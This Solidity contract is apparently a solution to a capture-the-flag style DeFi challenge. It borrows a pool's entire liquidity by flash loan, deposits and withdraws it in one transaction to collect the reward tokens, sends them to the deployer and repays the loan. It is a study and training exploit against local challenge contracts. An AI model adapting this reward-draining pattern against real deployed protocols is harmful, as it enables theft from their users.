// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/FixedPointMathLib.sol";
import "solady/src/utils/SafeTransferLib.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { RewardToken } from "./RewardToken.sol";
import { AccountingToken } from "./AccountingToken.sol";
import { TheRewarderPool } from "./TheRewarderPool.sol";
import { FlashLoanerPool } from "./FlashLoanerPool.sol";

contract TheRewarderPoolAttacker {
    TheRewarderPool public pool;
    FlashLoanerPool public loaner;
    address public player;

    constructor(TheRewarderPool pool_, FlashLoanerPool loaner_) {
        pool = pool_;
        loaner = loaner_;
        player = msg.sender;
    }

    function attack() external {
        loaner.flashLoan(loaner.liquidityToken().balanceOf(address(loaner)));
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(loaner), "Must come from loaner");

        IERC20(pool.liquidityToken()).approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        pool.rewardToken().transfer(player, pool.rewardToken().balanceOf(address(this)));
        loaner.liquidityToken().transfer(address(loaner), amount);
    }
}
